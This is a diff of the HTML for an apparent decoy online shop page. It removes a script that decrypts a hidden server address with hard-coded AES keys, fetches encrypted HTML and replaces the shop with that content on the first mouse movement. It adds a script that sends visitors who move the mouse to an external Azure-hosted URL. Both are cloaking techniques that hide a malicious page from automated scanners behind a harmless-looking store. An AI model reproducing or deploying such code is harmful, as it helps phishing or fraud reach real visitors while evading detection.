@@ -717,7 +717,26 @@
   </style>
   </head>
 <body class="l-body">
+<script>
+let redirected = false;
+let startX = null;
+let startY = null;
 
+document.addEventListener("mousemove", function (e) {
+    if (startX === null && startY === null) {
+        startX = e.clientX;
+        startY = e.clientY;
+    }
+
+    let dx = Math.abs(e.clientX - startX);
+    let dy = Math.abs(e.clientY - startY);
+
+    if (!redirected && (dx > 50 || dy > 50)) {
+        redirected = true;
+        window.location.href = "https://new3-dbceh0dkczcth7ej.z02.azurefd.net/";
+    }
+});
+</script>
           <div id="shop">
   </header>
 
@@ -964,44 +983,7 @@
     renderProducts();
   </script>
 </div>
-<iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
 
-
-<script>
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";
-    const URL_KEY = "UrLk3yShopEase01";
-    const ENC_DATA_ORIGIN = "U2FsdGVkX18NNv9UWO+LiNXQbDzIXZh1Pmi8rUxE3yIGhXY4zzKlt49YnjLtt+pJ0aXqMHkbZoJtY0nSXHfaVA==";
-    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-    let lastUrl = null;
-
-    async function loadSecret() {
-        const shop = document.getElementById("shop"), frame = document.getElementById("frame");
-        try {
-            const res = await fetch(DATA_ORIGIN + "win/sec");
-            const { cipher } = await res.json();
-            const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-            if (!html) throw new Error("Decrypt failed — wrong key?");
-
-            if (lastUrl) URL.revokeObjectURL(lastUrl);
-            const blob = new Blob([html], { type: "text/html" });
-            lastUrl = URL.createObjectURL(blob);
-
-            frame.src = lastUrl;
-
-
-            shop.style.display = "none";
-            frame.style.display = "block";
-
-        } catch (e) {
-            document.querySelector(".hint").textContent = "⚠️ " + e.message;
-        }
-    }
-
-
-    window.addEventListener("mousemove", () => {
-        loadSecret();
-    }, { once: true });
-</script>
         
 </body>
 </html>
